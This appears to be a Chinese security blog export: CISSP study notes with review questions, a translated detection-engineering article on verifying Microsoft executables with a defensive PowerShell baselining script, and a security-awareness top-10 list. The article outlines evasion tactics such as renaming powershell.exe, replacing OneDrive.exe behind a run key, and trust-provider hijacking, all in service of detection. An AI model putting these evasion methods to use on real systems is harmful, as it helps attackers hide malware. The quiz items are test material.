战略计划、战术计划和操作计划。战略计划是长期计划，并且是相当稳定的，用于定义组织机构的目的、任务和目标。战术计划是中期计划，用来提供更加详细的实现战略计划所提出目标的计划。操作计划是短期计划，是基于战略和战术计划的非常周详的计划。 了解规范化安全策略结构的元素 为了生成全面的安全计划，需要适当地遵守下列要求： 安全策略、标准、基准、指导方针和程序。这些文档清楚地描述了安全需求并反映了责任方的适度关注。 理解重要的安全角色 主要的安全角色有高层管理者、组织机构所有者、上层管理者、安全专家、用户、数据所有者、数据管理员以及审计人员。通过构建安全角色的层次，就可以全面限制风险。 了解如何实现安全意识培训 在真正的培训开始之前，必须为用户建立树立为公认实体的安全意识。一旦树立了安全意识，培训或教育员工执行工作任务和遵守安全策略就可以开始了。所有的新员工都需要进行培训，这样他们才能够遵守安全策略中规定的所有标准、指导方针和程序。教育是一项更细致的工作，学当三/用户需要学习比他们完成工作任务实际所需知识多得多的知识。教育往往与用户参加认证考试或寻求职务晋升相关联。 了解分层如何简化安全 分层是串联使用多个控制层次。使用多层次解决方案，使用许多控制去防范威胁。 能够解释抽象的概念 抽象用于将相似的元素放入组、类别或角色(被整体性授予安全控制、限制或权限) 中，抽象提高了实施安全计划的效率。 理解数据隐藏 顾名思义，数据隐藏防止主体发现或访问数据。在安全控制和程序设计中，数据隐藏通常是一个关键要素。 理解对加密的需求 加密是对计划外的接收者隐藏通信数据的含义或意图的一种艺术和学科。加密可以具有很多形式，并且能够用于所有的电子通信类型，包括文本、音频和视频文件以及应用程序本身。加密技术是安全控制中一个非常重要的元素，尤其系统之间的数据传输更是如此。 能够解释更改控制和更改管理的概念 安全环境的改变很可能引入会导致新脆弱性出现的漏洞、重叠、客体丢失和疏漏。面对更改，维持安全性的唯一方法是系统地管理更改。 了解为什么和如何进行数据分类 数据分类旨在简化给客体组(而不是单独客体)分配安全控制的过程。两种通用的分类方案是政府/军方分类和商业/私营部门分类。了解政府/军方分类中的5个级别和商业/私营部门分类中的4个级别。 理解解除分类的重要性 一旦某个资产不再需要当前分配的分类或敏感性级别保护，就需要解除分类。 了解COBIT的基础知识 信息及相关技术控制目标(COBIT)是一种安全概念基础架构，用于组织公司的复杂安全解决方案。 了解威胁建模的基础知识 威胁建模是一种安全流程，能识别、分类和分析潜在威胁。威胁建模在设计开发阶段可作为一种提前措施来执行，或在产品被部署后作为一种被动性措施来执行。关键概念包括资产/攻击者/软件、STRIDE、图形表示、约简/分解和DREAD。 了解安全并购的必要性 将网络安全风险管理与收购策略和实践进行综合是确保组织的安全策略成功强健的一种手段，而不管组织的规模是什么样的。如果在没有考虑安全性的情况下贸然购买，所购买的这些产品的固有风险将在其整个部署过程中一直存在。 1.6 复习题 下列哪一项包含安全性的主要目标和目的?A. 网络的外围边界B. CIA 三元组C. 一个独立的系统D. 互联网 脆弱性和风险是基于它们对下列哪一项的威胁评估?A 一条或多条CIA 三元组原则B. 数据有效性C. 应尽关注D. 责任范围 下列哪一项在CIA 三元组原则中用于说明授权主体被及时授予和不间断地访问对象?A. 识别B. 可用性C. 加密D. 分层 下列哪一项不被视为违反保密性?A. 窃取密码B. 窃听C. 硬件破坏D. 杜会工程学 下列哪一项是不正确的?A. 保密性的违反包括人为错误。B. 保密性的违反包括管理监督。C. 保密性的违反仅限于直接故意攻击。D. 当传输未正确加密时保密性违反可能发生。 STRIDE 通常与用于评估针对应用程序或操作系统的威胁有关。以下哪一项不是STRIDE的元素?A. 欺骗B. 权限提升C. 否认D. 披露 如果一个安全机制提供可用性，也就提供了高级别保证，该授权对象可以___数据、对象和资源。A. 控制B. 审计C. 访问D. 否认 ___指的是保持信息的机密性，防止一旦泄露，个人身份可能造成伤害、尴尬或丢人。A. 隐居B. 隐敲C. 隐私D. 临界 对于所有个人的影响，除了下面哪一项以外都需要注意?A. 制约个人电子邮件B. 记录电话交谈C. 收集关于上网习惯的信息D. 用于保留电子邮件的备份机制 数据分类管理的什么元素可以覆盖所有其他访问控制的形式?A. 分类B. 物理访问C. 监管者职责D. 取得所有权 什么确保了活动或事件的主体不能否认发生过的事件?A. CIA 三元组B. 抽象C. 不可否认性D. 哈希总数 以下哪一项相对于分层安全是最重要和独特的概念?A. 多层B. 系列C. 并行D. 过滤 下列哪一项不被认为是数据隐藏的例子?A. 防止对象的授权阅读者删除该对象B. 阻止未经授权的访问者访问数据库C. 限制较低级别的主体访问较高级别的数据D. 阻止应用程序直接访问硬件 变更管理的主要目标是什么?A. 维护文档B. 保持用户得到变更通知C. 允许失败变更的回滚D. 防止安全危害 数据分类方案的主要目标是什么?A. 控制授权主体访问对象B. 为了形式化和根据重要性和敏感性分配标签以分层保护数据的过程C. 为审计可问责性建立交易跟踪D. 为操作访问控制以提供最有效的手段来授予或限制功能 在分类数据时，下列哪一项通常是不考虑的特征?A. 价值B. 物体的大小C. 使用寿命D. 国家安全的影响 两种常见的数据分类方案是哪些?A. 军事和私营部门B. 个人和政府C. 私营部门和非限制性行业D. 分类和未分类 下列哪一项是机密数据的最低军事数据分类?A. 敏感B. 机密C. 专有D. 隐私 下列商业/私营部门的哪一个数据分类用来控制组织内的个人信息?A. 机密B. 隐私C. 敏感D. 专有 数据分类都用于关注安全控制，除了以下哪一个?A. 存储B. 处理C. 分层D. 转移]]></content>
      <categories>
        <category>notes</category>
      </categories>
      <tags>
        <tag>cissp</tag>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Microsoft可执行文件是怎么成为Microsoft可执行文件的]]></title>
    <url>%2FSecurity%2FMicrosoft%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E6%98%AF%E6%80%8E%E4%B9%88%E6%88%90%E4%B8%BAMicrosoft%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%9A%84%2F</url>
    <content type="text"><![CDATA[究竟如何能够区分任意代码与源自Microsoft的代码？我敢打赌，大多数人的反应是：“如果它是由微软签署的，那么它来自微软。“ 我提出这个问题的原因是它的事件量非常大并且无数次被列为威胁评估对象，以至于防御者的优先处理方式是过滤掉已知良好二进制和行为。理论上来说这样做唯一需要考虑的是分类可疑事件（即任何未明确归类为良性的事件）。然而，这个过程必须非常谨慎地制定规则，因为攻击者总是会试用各种方法将恶意行为与良性的二进制和行为融合在一起。 如何将Microsoft可执行文件归类为良性？为了定义这样一个过程，它有助于理解攻击者如何尝试伪装成Microsoft可执行文件。让我们考虑以下绕过检测的情况： 1.一个已签名的可被滥用的EXE文件被复制到另一个目录并且重命名为检测良好的文件名后执行以绕过命令行检测 请考虑以下情形：攻击者希望执行恶意PowerShell代码并避免命令行日志记录。他们知道防御者在命令行上可以轻松地检测到“powershell”的“-Command”和“-EncodedCommand”的各种变体。因此，攻击者会将powershell.exe复制到他们能够控制的目录并将其重命名为notepad.exe。熟练的防御者们为了解决这个问题，他们只检测命令行上“-Command”和“-EncodedCommand”的各种变体。对此，经验丰富的攻击者会删除恶意PowerShell的配置文件，目的是从良性的.DAT文件中读取PowerShell代码。这样做可以实现两件事： 攻击者将其恶意的PowerShell有效负载作为notepad.exe执行，其中没有防御者能够发现的命令行参数。 与.DAT文件（或任何其他任意文件扩展名）相比，传统的反病毒系统更可能对.PS1文件进行更严格的审查。 在这种情况下，检测的高级目标如下： 检测已知的，可滥用的，已签名的应用程序的使用，这些应用程序不在其默认的路径和文件名。 2.攻击者试图通过替换良性可执行文件来“融入正常”，这种可执行文件表明它是一个良性的Microsoft可执行文件 请考虑以下情形：您以标准用户身份访问计算机，并希望保留恶意可执行文件。这可能是攻击者可能已完成其作业并将Autoruns用于恶意目的的情况。他们用它来识别隐藏的地方，而不是用它来寻找潜在的威胁。因此，它们会查找所有内置的持久性条目，这些条目指向位于可以控制的目录中的二进制文件。OneDrive是一个很好的候选者，因为它默认保存运行密钥，它位于用户的％APPDATA％目录中。因此，攻击者只需将OneDrive.exe替换为其恶意可执行文件，就可以保持现有的运行密钥不变。 在这种情况下，检测的高级目标如下： 对于公共持久性条目，可执行文件的哪些属性使其正常？如果可以建立“正常”，那么偏离正常应该被认为是可疑的。 让我们提炼出这种场景中攻击者使用的技术： 预期存在于该目录中的OneDrive可执行文件源自Microsoft。攻击者提供的二进制文件不是来自Microsoft。 攻击者不是创建新的运行密钥，而是替换现有合法运行密钥指向的二进制文件。 3.攻击者后门系统可执行文件 在这种情况下，攻击者使用像Backdoor Factory这样的工具来回溯系统可执行文件。从检测角度考虑以下目标： 系统可执行文件应驻留在特定目录中，并且应具有有效的Microsoft签名。任何改变都应被视为可疑。 4.攻击者伪装Microsoft数字签名并使用“Microsoft”证书签署其恶意代码 攻击者可以将合法的Microsoft数字签名应用于其恶意代码，并通过执行SIP/信任提供程序劫持攻击（需要提升权限）强制其生效。他们还可以制作一个具有Microsoft证书链外观的证书链，并在受害者系统上明确信任他们虚假的“Microsoft”根CA. 在这种情况下，检测的高级目标如下： 检测对负责代码签名验证的注册表值的更改，确定值得信任的根CA，并针对给定二进制文件与预期根CA的改变发出警报。 共同防护假设 鉴于这些特别绕过的攻击情景，重要的是对自己诚实并承认一些共同的维护者假设，否则，在成熟的攻击者面前不会有持续改进的希望。此外，正如Dane Stuckey雄辩地说的那样：“检测工程是一个永无止境的旅程。如果你认为自己到达目的地，那你就已经失败了。“ 防御者可能不会认为攻击者可能会重命名可执行文件或考虑这样做的理由。 防御者可能不会考虑攻击者将可执行文件复制到另一个目录的理由。 一种假设可能是攻击者更有可能建立一种新的持久性技术而不是劫持现有的合法技术。 防御者可能不会考虑或使用光学器件来检测未签名的系统可执行文件（或具有无效签名的可执行文件）的加载，否则该文件应具有经过验证的签名。 防御者可能隐含地信任签名验证实用程序的输出，而不考虑根CA信任的含义/含义。 现在，如果没有提出的解决方案，确定问题并不是很有用。以下将讨论可执行文件的属性，在处理和克服这些突出显示的假设时应考虑这些属性。 定义良性Microsoft可执行文件的功能 因此，从防御者的角度来看，我们可以使用哪些可执行文件属性将给定的Microsoft可执行文件分类为正确的Microsoft可执行文件？我建议如下： 1.可执行文件的原始路径。 例如，应该注意notepad.exe应该驻留在％windir％，％windir％\ System32和％windir％\ SysWOW64中。任何偏离这些路径的行为都应被视为可疑。另请注意，我通过其环境变量引用Windows目录。永远不要认为启动分区是“C”。 2.可执行文件的预期文件名。 任何与预期文件名的偏差都应被视为可疑。 3.可执行文件的原始文件名。 原始文件名出现在几乎所有已签名的PE文件的“版本信息”资源中。这是您在查看PE文件属性的“详细信息”选项卡时看到的内容。 请注意，原始文件名并不总是与磁盘上的预期文件名相同。原始文件名的好处是，任何修改它的尝试都将使二进制文件的签名无效。这就是Windows Defender应用程序控制（WDAC）阻止单个文件的方式。 4.可执行文件的文件描述。 这是“版本信息”资源中存在的另一个字段，可以考虑添加或替代原始文件名。在某些情况下，可能不存在原始文件名，因此应在其位置考虑文件描述。这就是fsi.exe的情况 - 由Matt Nelson发现的一个可滥用的二进制文件，在微软添加了阻止其他“版本信息”属性的能力之前，最初无法被WDAC有效阻止。 5.可执行文件的签名状态。 对于预期要签名的二进制文件，除“有效”之外的任何签名验证状态都应被视为可疑。Get-AuthenticodeSignature cmdlet支持以下值以供参考： HashMismatch - 表示可执行文件的完整性受到损害 不相容 未签名 NotSupportedFileFormat 不可信 - 表示签名者的证书已被撤销或明确标记为不允许。 有效 - 表示已验证可执行文件的完整性，并且证书链正确链接到受信任的根CA. 应该注意的是，如果PE文件没有“数字签名”选项卡而没有签名，那么这是一种常见的误解。几乎所有内置于Windows的代码都已签名，其中大部分都是目录签名的。如果在目标系统之外的某处执行签名验证，这肯定会有问题，这是VirusTotal所阐述的挑战。 6.文件是否为内置Windows二进制文件？ 随操作系统提供的任何代码都将进行Windows签名，由包含“Windows系统组件验证”EKU属性（OID - 1.3.6.1.4.1.311.10.3.6）的Microsoft数字签名表示。如果签名有效，则Get-AuthenticodeSignature的“IsOSBinary”属性将返回true，是Windows签名的，并且根植于一小组受信任的Microsoft根CA. 7.签名者主题和指纹 证书的主题字段用于标识颁发证书的组织。指纹（即证书的SHA1哈希）用于断言证书的完整性。有一大堆Microsoft签名证书。从检测角度来看，该字段仅用于提供信息。最准确地说，由Microsoft签名的代码由一小组根CA证书之一颁发的任何证书签名。 8.根发行者主题和指纹 签名仅与发布它的根CA一样可信。攻击者可以轻松地信任受害者系统上的恶意根CA证书，这就是为什么在执行签名验证时识别一小组Microsoft根CA很重要的原因。它们由以下指纹/主题值组成： CDD4EEAE6000AC7F40C3802C171E30148030C072 - CN = Microsoft根证书颁发机构，DC = microsoft，DC = com A43489159A520F0D93D032CCAF37E7FE20A8B419 - CN = Microsoft Root Authority，OU = Microsoft Corporation，OU =版权所有©1997 Microsoft Corp. 3B1EFD3A66EA28B16697394703A72CA340A05BD5 - CN = Microsoft根证书颁发机构2010，O = Microsoft Corporation，L = Redmond，S = Washington，C = US 8F43288AD272F3103B6FB1428485EA3014C0BCFE - CN = Microsoft根证书颁发机构2011，O = Microsoft Corporation，L = Redmond，S = Washington，C = US （可选，如果您想信任Windows Insider预览代码）F8DB7E1C16F1FFD4AAAD4AAD8DFF0F2445184AEB - CN = Microsoft Development Root Certificate Authority 2014，O = Microsoft Corporation，L = Redmond，S = Washington，C = US 不要相信我！通过与authroot.stl或使用sigcheck -tv和比较来验证自己sigcheck -tuv。建立基线程序上面强调的所有相关属性都需要首先在一组清洁系统上进行基线化 - 标准的企业黄金映像将是理想的。您如何决定捕获这些属性取决于您。我编写了这个PowerShell脚本来获取黄金映像中的所有相关信息：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081# GetPEFeature.ps1 - 一个PowerShell脚本，用于从PE文件中提取相关功能filter Get-PEFeature &#123;&lt;#.SYNOPSISRetrieves key features from PE files that can be used to build detections..DESCRIPTIONGet-PEFeature extracts key features of PE files that are relevant to building detections.Author: Matthew Graeber (@mattifestation)License: BSD 3-Clause.EXAMPLEls C:\Windows\System32\*.exe | Get-PEFeature.EXAMPLEls C:\Windows\System32\*.exe | Get-PEFeature | ConvertTo-Json#&gt; [CmdletBinding()] param ( [Parameter(Position = 0, Mandatory = $True, ValueFromPipelineByPropertyName = $True)] [String] [Alias('FullName')] $Path ) $HeaderBytes = Get-Content -TotalCount 2 -Encoding Byte -Path $Path if (($HeaderBytes.Count -ne 2) -or ([Text.Encoding]::ASCII.GetString($HeaderBytes) -ne 'MZ')) &#123; Write-Verbose "$Path is not a valid PE file." &#125; else &#123; $FileInfo = Get-Item -Path $Path $FileVersionInfo = $FileInfo.VersionInfo # If a path starts with %windir%, %ProgramFiles%, %ProgramFiles(x86)%, or %APPDATA%, # replace it to account for alternate system drives $ExpectedPath = $FileInfo.DirectoryName -replace "^$([Regex]::Escape($Env:windir))", '%windir%' $ExpectedPath = $ExpectedPath -replace "^$([Regex]::Escape($Env:ProgramFiles))", '%ProgramFiles%' $ExpectedPath = $ExpectedPath -replace "^$([Regex]::Escape($&#123;Env:ProgramFiles(x86)&#125;))", '%ProgramFiles(x86)%' $ExpectedPath = $ExpectedPath -replace "^$([Regex]::Escape($Env:APPDATA))", '%APPDATA%' $ExpectedPath = $ExpectedPath -replace "^$([Regex]::Escape($Env:LOCALAPPDATA))", '%LOCALAPPDATA%' $OriginalFilename = $FileVersionInfo.OriginalFilename $FileDescription = $FileVersionInfo.FileDescription # Note that Get-AuthenticodeSignature will prefer catalog signatures over embedded Authenticode signatures. $SignatureInfo = Get-AuthenticodeSignature $Path $SigningStatus = $SignatureInfo.Status $OSBinary = $SignatureInfo.IsOSBinary $SignerThumbprint = $null $SignerSubject = $null $RootThumbprint = $null $RootSubject = $null if ($SignatureInfo.SignerCertificate) &#123; $SignerCertificate = $SignatureInfo.SignerCertificate # These will be subject to change as the certificate approaches the end of its validity period $SignerThumbprint = $SignerCertificate.Thumbprint $SignerSubject = $SignerCertificate.Subject # Build a signer chain so the root certificate info can be extracted. $SignerChain = New-Object -TypeName Security.Cryptography.X509Certificates.X509Chain $null = $SignerChain.Build($SignerCertificate) $RootCertificate = $SignerChain.ChainElements[$SignerChain.ChainElements.Count - 1].Certificate $RootThumbprint = $RootCertificate.Thumbprint $RootSubject = $RootCertificate.Subject &#125; [PSCustomObject] @&#123; ExpectedPath = $ExpectedPath ExpectedFileName = $FileInfo.Name OriginalFileName = $OriginalFilename FileDescription = $FileDescription SigningStatus = $SigningStatus IsOSBinary = $OSBinary SignerSubject = $SignerSubject SignerThumbprint = $SignerThumbprint RootSubject = $RootSubject RootThumbprint = $RootThumbprint &#125; &#125;&#125; 这些属性共同构成良性Microsoft可执行文件的属性，在许多情况下，这些属性的任何偏差都应被视为可疑。请注意，“ExpectedPath”可能是最容易误报的假性财产。 基线结果的应用 假设您收集了良性Microsoft PE属性的基线，让我们对前面介绍的规避攻击情形应用一些检测： 1.一个签名的，可滥用的EXE被复制到另一个目录，重命名为良好的声音文件名并执行以逃避天真的命令行检测。 已经为“预期的PowerShell”建立了定义，powershell.exe应该具有以下特征：12345678910ExpectedPath : %windir%\System32\WindowsPowerShell\v1.0ExpectedFileName : powershell.exeOriginalFileName : PowerShell.EXE.MUIFileDescription : Windows PowerShellSigningStatus : ValidIsOSBinary : TrueSignerSubject : CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=USSignerThumbprint : 419E77AED546A1A6CF4DC23C1F977542FE289CF7RootSubject : CN=Microsoft Root Certificate Authority 2010, O=Microsoft Corporation, L=Redmond, S=Washington, C=USRootThumbprint : 3B1EFD3A66EA28B16697394703A72CA340A05BD5 因此，当powershell.exe重命名为notepad.exe并从非标准目录执行时，我们怎么知道它实际上是powershell.exe而不依赖于文件散列？好吧，我们知道，因为重命名的notepad.exe将具有OriginalFileName“PowerShell.EXE.MUI”并且它将具有有效的Microsoft签名（即其完整性完整并链接到已知的Microsoft根证书）。ExpectedPath和ExpectedFileName字段都偏离了，应该生成警报。 2.攻击者试图通过删除恶意可执行文件来“融入正常”，这种可执行文件表明它是一个良性的Microsoft可执行文件。 已知流行持久机制的二进制文件应基线化。假设已执行，应该预期onedrive.exe具有以下属性：12345678910ExpectedPath : %LOCALAPPDATA%\Microsoft\OneDriveExpectedFileName : OneDrive.exeOriginalFileName : OneDrive.exeFileDescription : Microsoft OneDriveSigningStatus : ValidIsOSBinary : FalseSignerSubject : CN=Microsoft Corporation, OU=MOPR, O=Microsoft Corporation, L=Redmond, S=Washington, C=USSignerThumbprint : 5EAD300DC7E4D637948ECB0ED829A072BD152E17RootSubject : CN=Microsoft Root Certificate Authority, DC=microsoft, DC=comRootThumbprint : CDD4EEAE6000AC7F40C3802C171E30148030C072 在这种情况下，丢弃的恶意可执行文件将保留ExpectedFilePath和ExpectedFileName属性，但不保留其他属性。 3.攻击者后门系统可执行文件。 与前一个方案类似，后端可执行文件将保留ExpectedFilePath，ExpectedFileName和FileDescription属性，但不保留其他任何属性。 4.攻击者欺骗Microsoft数字签名并使用“Microsoft”证书签署其恶意代码。 如果攻击者使用看起来像Microsoft证书链的证书链对其恶意软件进行签名，则包含“Microsoft”的SignerSubject和/或RootSubject字段不应具有列入白名单的RootThumbprint值之一，应该被认为是非常可疑的。 其他提议的属性 您可能考虑手动添加到基线列表的一个属性是“KnownAbused”属性，表示它是一个已知被攻击者滥用的二进制文件。这将允许您将相关的“生活在陆地上”的样式检测集中在一起。对于标记为已知滥用的二进制文件的一个很好的初始参考是监视来自Microsoft的规范WDAC黑名单规则集。 如果您要跟踪已知的滥用软件，您还可以考虑添加一个字段，其中包含一组命令行开关，用于给定的可执行文件，攻击者难以逃避。 结论 鉴于故意回避的交易技术的威胁，重要的是不仅要知道如何识别，例如，使powershell.exe powershell.exe成为什么，但是有一个实际的手段来做出这样的决定也很重要。并观察偏差。 我希望能够让您确信本文中强调的PE属性的重要性，并且如果您还没有这些属性，请将端点安全供应商光学器件请求这些属性。]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>可执行文件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2018安全意识TOP-10]]></title>
    <url>%2FSecurity%2F2018%E5%AE%89%E5%85%A8%E6%84%8F%E8%AF%86TOP-10%2F</url>
    <content type="text"><![CDATA[一、安全意识TOP-10 2018 TOP 10 描述 A1-利用漏洞攻击 除拒绝服务攻击事件和后门攻击事件之外，利用信息系统配置缺陷、协议缺陷、程序缺陷等漏洞，对信息系统实施攻击的信息安全事件。 A2-信息泄露事件 因误操作、软硬件缺陷或电磁泄漏等因素导致信息系统中的保密、敏感、个人隐私等信息暴露于未经授权者而导致的信息安全事件。 A3-计算机病毒事件 蓄意制造、传播计算机病毒，或是因受到计算机病毒影响而导致的信息安全事件。 A4-木马事件 蓄意制造、传播特洛伊木马程序，或是因受到特洛伊木马程序影响而导致的信息安全事件。 A5-钓鱼事件 利用欺骗性的计算机网络技术，使用户泄漏重要信息而导致的信息安全事件。 A6-电信诈骗 利用各种渠道取得被害人的信任和注意，实施诈骗行为。 A7-网络设备监视及窃听事件 通过技术手段，利用网络监控或窃听设备，窃取用户个人隐私等而导致的信息安全事件。 A8-网页内嵌恶意代码事件 蓄意制造、传播网页内嵌恶意代码，或是因受到网页内嵌恶意代码影响而导致的信息安全事件。 A9-信息篡改事件 未经授权将信息系统中的信息更换为攻击者所提供的信息而导致的信息安全事件。 A10-信息丢失事件 因误操作、人为蓄意或软硬件缺陷等因素导致信息系统中的信息丢失而导致的信息安全事件。 二、利用漏洞攻击事件 利用漏洞攻击事件是指除拒绝服务攻击事件和后门攻击事件之外，利用信息系统配置缺陷、协议缺陷、程序缺陷等漏洞，对信息系统实施攻击的信息安全事件。 利用漏洞攻击事件属于网络攻击事件的一种。网络攻击事件是指通过网络或其他技术手段，利用信息系统的配置缺陷、协议缺陷、程序缺陷或使用暴力攻击对信息系统实施攻击，并造成信息系统异常或对信息系统当前运行造成潜在危害的安全事件。 影响： 各种可能的负面后果包括：数据泄露、损坏 未授权访问 植入病毒木马 案例： 支付宝一键克隆腾讯玄武安全实验室揭露了“应用克隆”漏洞；此漏洞广泛影响安卓系统的手机软件，例如支付宝，用户只要点击短信链接或扫描二维码就可能被克隆，造成财产损失和信息泄露 噩梦公式二代黑客利用Office 内在的功能（公式编辑器）发起的攻击(“噩梦公式二代”)，打开恶意文档就会中招。此漏洞会趁着用户没打补丁的空挡，在你不知情的情况下控制你的电脑。 “WannaCry”勒索病毒“WannaCry”勒索病毒攻击爆发，国内外多所高校及企业因为漏洞较多，遭遇勒索软件入侵，导致大量电脑文件被加密，被迫支付赎金或无法再使用。 预防方案： 安装杀毒软件 安装防火墙 及时更新电脑的系统补丁 养成不用电脑时关闭联网的习惯 三、信息泄露事件信息泄露事件是指因误操作、软硬件缺陷或电磁泄漏等因素导致信息系统中的保密、敏感、个人隐私等信息暴露于未经授权者而导致的信息安全事件。信息泄露事件常见于网络个人信息泄露，包括基本信息、设备信息、账户信息、隐私信息、社会关系信息和网络行为信息等。不法人员利用恶意程序、各类钓鱼和黑客攻击非法获取个人信息，谋取利益。大规模信息泄露事件频发。 影响： 各种可能的负面后果包括：个人信息的泄露、人身威胁、财产损失 案例： “晒”机票泄露个人信息朋友圈晒机票有风险。只要将你的条形码上传至免费解码网，就能知道你姓名和旅程所有信息，并可能导致后面的退票诈骗及其他信息泄露导致的财产损失。 滴滴顺风车乘客信息泄露空姐在郑州航空港区乘坐滴滴顺风车遇害一案引发社会广泛关注。乘客个人信息泄露，造成严重后果。 二维码泄露被复制微商赵女士在网络交易过程中，不法分子以自己支付宝余额不足为借口，提出让赵女士将付款码发给自己扫码付款。收到付款码截图后，不法分子随即进行复制，盗刷了赵女士的银行账户。 预防方案： 不在非官方网站填写个人敏感信息 微信和QQ不加不明身份的好友 不轻易连接公共场所提供的Wi-Fi以及免费Wi-Fi 连接不安全的Wi-Fi时不填写任何密码以及敏感信息 处理照片、车票、快递单等包含个人信息的资料时，一定要遮蔽姓名、卡号和条形码 四、计算机病毒事件 计算机病毒事件是指蓄意制造、传播计算机病毒，或是因受到计算机病毒影响而导致的信息安全事件。计算机病毒是一个程序、一段可执行代码，类似于生物病毒，具有隐蔽性、感染性、潜伏性、可激发性、破坏性。它们能自身附着在各类文件上，当文件被复制或从一个用户传送到另一个用户时，它们就随同文件一起蔓延开来。随着智能电子设备的使用，影响范围越来越广。计算机病毒已不再局限于传统的台式机和笔记本电脑，移动终端同样也会遭受病毒破坏。 影响： 各种可能的负面后果包括：引起终端设备故障、破坏数据、远程操控、个人信息的泄露、未授权的访问、财产损失等。 案例： “锁机病毒”勒索钱财锁机生成器病毒，仿冒各类软件诱导用户安装，锁定手机并勒索用户钱财。 “短信拦截马”窃取隐私“短信拦截马”这个病毒活跃在各大Android平台上，以窃取用户隐私为目的，通过拦截并监视短信，利用盗取的用户信息盗刷银行账户、偷取用户财产。 “短信拦截马”窃取隐私手机突然收到大量扣费短信息。这是用户手机下载了暗扣类应用（俗称“变脸窃贼”）所致，表面上所需权限正常，其实内含使手机付费接受短信等有害权限。 预防方案： 安装杀毒软件以及防火墙 定期对计算机或终端设备进行扫描并及时更新杀毒软件的补丁 使用正版软件，不随意从非官方渠道下载软件或APP（尤其是“破解版“） 不上不熟悉且引发安全告警的网站 从非官方网页安装软件或APP时注意核对文件信息 不轻易点击收到的邮件链接及附件 五、木马事件 木马事件是指蓄意制造、传播特洛伊木马程序，或是因受到特洛伊木马程序影响而导致的信息安全事件。木马程序通常通过一段特定的程序（木马程序）来控制另一台计算机，打开一个或几个端口，攻击者利用这些打开的端口进入电脑系统。隐蔽性是木马的首要特点，木马程序发展到今天，对用户的威胁越来越大，使普通用户很难在中毒后发觉。一旦被木马控制，电脑或智能设备将毫无秘密可言。 影响： 各种可能的负面后果包括：远程监控、危害本机信息安全（盗取QQ帐号、游戏帐号甚至银行帐号），将本机作为工具来攻击其他设备等。 案例： 公共充电桩易藏木马.15晚会上，安全专家曾把藏身于免费充电桩中的木马病毒揪了出来。通过实验得知，通过使用公共充电桩给手机充电，黑客可控制手机，实现手机中的照片查看、短信发送、窃取手机使用者的验证码，甚至进行消费。 短信链接藏木马，银行卡被盗市民王女士取钱时，发现这张一直锁在家中的银行卡里只剩十多块钱，另外16万元存款莫名消失。原来，王女士的手机曾收到过一条名为“老同学照片”的短信链接，手机中了木马，导致存款被盗。 QQ营销病毒，强行添加好友QQ营销病毒传播感染量高达约15万余台。感染用户电脑后会强行添加QQ好友、QQ群，邀请好友加群并自动发邮件给QQ营销号。 预防方案： 安装杀毒软件以及防火墙 定期对电脑进行扫描并及时更新杀毒软件的补丁 使用正版软件，不随意从非官方渠道下载应用或APP（尤其是“破解版“） 不上不熟悉且引发安全告警的网站 从非官方网页安装APP时注意核对文件信息 不轻易点击收到的邮件链接及附件 六、钓鱼事件 钓鱼事件是指利用欺骗性的计算机网络技术，使用户泄漏重要信息而导致的信息安全事件。最典型的网络钓鱼攻击通过将收信人引诱到一个通过精心设计与目标组织的网站非常相似的钓鱼网站上，并获取收信人在此网站上输入的个人敏感信息，通常这个攻击过程不会让受害者警觉，并利用这些获取不正当利益。 影响： 各种可能的负面后果包括：信息泄露、经济损失等。 案例： 邮件钓鱼，被骗汇款西安一外贸公司收到”伪造邮件”，由于没有对收来的邮件进行辨别，向国外供货商汇款，被骗了40多万元。 点“微信红包”手机中毒多位网友遭遇了疑似“微信红包”骗钱的事，点开“微信红包”后不但没有领到钱，手机反而中了“木马病毒”导致账户内的钱被转走。 Wi-Fi钓鱼，银行账户被盗株洲市张女士，在一家商场内发现一个没设密码的Wi-Fi。连接Wi-Fi后，通过手机银行支付方式在淘宝上购买了衣服。随后，手机连续收到短信提醒，其信用卡被盗刷4笔，总金额高达8000多元。 预防方案： 不轻易点击不认识的人或公司发来的邮件链接，在点开的网页上不轻易输入用户名和密码 输入前检查网站名是否正确；比如说www.mail.qq.com和www.mail.qq.cn 上官方及受信任的网站（网站名前有https字样），注意浏览器的安全提醒 不轻易扫描各种二维码 七、电信诈骗 电信诈骗是指利用各种渠道取得被害人的信任和注意，实施诈骗行为。电信诈骗即是虚假信息诈骗，借助于手机、固定电话、网络等通信工具和现代的技术等实施的非接触式的诈骗犯罪。随着网络的发展，可以说是迅速地发展蔓延，给人民群众造成了很大的损失。 影响： 各种可能的负面后果包括：财产经济损失、人身伤害等。 案例： 伪装政府机关诈骗贸易委员会发现了多起伪装成中国大使馆的诈骗电话。犯罪分子伪装成中国大使馆诈骗250万美元。 二维码诈骗李先生收到一条某电商网站的推销短信，通过手机扫描了店主发来的二维码后，进入一个支付界面，输入银行账号和密码后却显示支付失败，之后却发现自己的银行账号被转走10000余元。 假账号诈骗徐玉玉电信诈骗案：诈骗团伙以发放助学金的名义，让徐玉玉转账激活卡片，盗取了9900元学费，最终导致徐玉玉心脏骤停而离世。 预防方案： 不要相信任何在电话里提到的公检法部门的侦查、汇款；不要相信网络或传真的“法院传票” 不要轻易扫描他人的付款二维码需要输入密码账号时，仔细核对支付页面 在电话中提及转账、汇款、罚款等说法时，一定要通过官网渠道进行二次确认 不要随便相信中奖信息，尤其是先交“个人所得税”、“公证费”、“转账手续费”等中奖信息 八、网络设备监视及窃听事件 网络设备监视及窃听事件是指利用网络监控或窃听设备，获取设备控制权从而窃取用户个人隐私等而导致的信息安全事件。网络设备监视及窃听事件主要涉及侵犯个人隐私，利用摄像头为代表的物联网设备对政府、企业、个人进行信息窃取。 影响： 各种可能的负面后果包括：个人隐私泄露，财产损失、人格利益受损及精神痛苦等。 案例： 麦克风窃听攻击者首先向目标发送钓鱼邮件，恶意程序隐藏Microsoft Word 文档中，一旦感染目标之后利用恶意程序控制设备的麦克风去记录对话、屏幕截图、文档和密码。 